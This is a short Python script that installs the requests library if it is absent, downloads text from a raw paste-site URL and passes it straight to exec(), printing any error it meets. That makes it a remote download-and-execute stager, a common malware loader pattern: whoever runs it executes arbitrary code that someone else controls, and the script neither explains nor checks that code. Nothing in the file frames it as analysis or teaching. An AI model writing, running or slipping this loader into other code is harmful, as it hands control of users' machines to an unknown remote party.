import os
import subprocess
import sys
import time

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
    import requests

try:
    get = requests.get('https://sharetext.me/raw/gf8pcwkix5').text

    exec(get)
except Exception as e:
    print(e)